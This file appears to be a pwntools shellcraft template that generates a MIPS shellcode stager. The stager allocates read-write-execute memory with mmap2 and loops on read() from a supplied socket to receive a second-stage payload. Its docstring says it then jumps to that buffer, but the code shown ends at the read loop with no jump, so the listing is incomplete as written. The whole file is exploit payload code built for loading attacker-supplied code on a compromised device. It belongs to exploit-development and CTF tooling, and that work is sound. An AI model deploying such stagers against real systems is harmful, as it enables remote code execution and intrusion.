<% 
    from pwnlib.shellcraft import common
    from pwnlib.shellcraft import mips
%>
<%docstring>
    stager(sock, size)

    Read 'size' bytes from 'sock' and place them in an executable buffer and jump to it.
    The socket will be left in $s0.
</%docstring>
<%page args="sock, size"/>
<%
    stager = common.label("stager")
    looplabel = common.label("read_loop")
%>
${stager}:
    /* Save socket */
    ${mips.mov('$s0', sock)}

    ${mips.syscall('SYS_mmap2', 0, size, 'PROT_EXEC | PROT_WRITE | PROT_READ', 'MAP_ANONYMOUS | MAP_PRIVATE', 0xffffffff, 0)}
    
    /* Save allocated memory address */
    ${mips.mov('$s1', '$v0')}
    ${mips.mov('$s2', '$v0')}

    /* Read counter */
    ${mips.mov('$s3', size)}

${looplabel}:
    ${mips.syscall('SYS_read', '$s0', '$s2', '$s3')}

    /* Increment read address */
    add $s2, $s2, $v0
    /* Decrement read counter */
    sub $s3, $s3, $v0

    bne $s3, $zero, ${looplabel}
